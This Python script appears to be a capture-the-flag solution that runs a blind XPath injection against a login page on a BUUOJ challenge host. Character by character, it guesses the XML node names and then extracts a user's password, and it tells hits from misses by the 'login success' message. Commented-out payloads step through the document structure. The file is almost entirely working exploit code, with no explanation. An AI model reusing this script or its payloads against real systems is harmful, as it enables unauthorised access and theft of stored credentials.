import requests
import time
url ='http://d5dc6fdb-a73b-409d-8b67-121d712142dd.node4.buuoj.cn:81/index.php'


strs ='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'


flag =''
for i in range(1,100):
    for j in strs:

        #猜测根节点名称
        # payload_1 = {"username":"<username>'or substring(name(/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password>".format(i,j),"password":123}
        #猜测子节点名称
        # payload_2 = "<username>'or substring(name(/root/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测accounts的节点
        # payload_3 ="<username>'or substring(name(/root/accounts/*[1]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #猜测user节点
        # payload_4 ="<username>'or substring(name(/root/accounts/user/*[2]), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])

        #跑用户名和密码
        # payload_username ="<username>'or substring(/accounts/user[1]/username/text(), {}, 1)='{}'  or ''='".format(i,j)
        payload_username ="<username>'or substring(/accounts/user[1]/password/text(), {}, 1)='{}'  or ''='".format(i,j)
        data={
            "username":payload_username,
            "password":123,
            "submit":"1"
        }
        #
        # payload_password ="<username>'or substring(/root/accounts/user[2]/password/text(), {}, 1)='{}'  or ''='</username><password>3123</password><token>{}</token>".format(i,j,token[0])


        print(payload_username)
        r = requests.post(url=url,data=data)
        time.sleep(0.1)
        #print(r)
#003d7628772d6b57fec5f30ccbc82be1

        if "登录成功" in r.text:
            flag+=j
            print(flag)
            break

    if "登录失败" in r.text:
        break

print(flag)

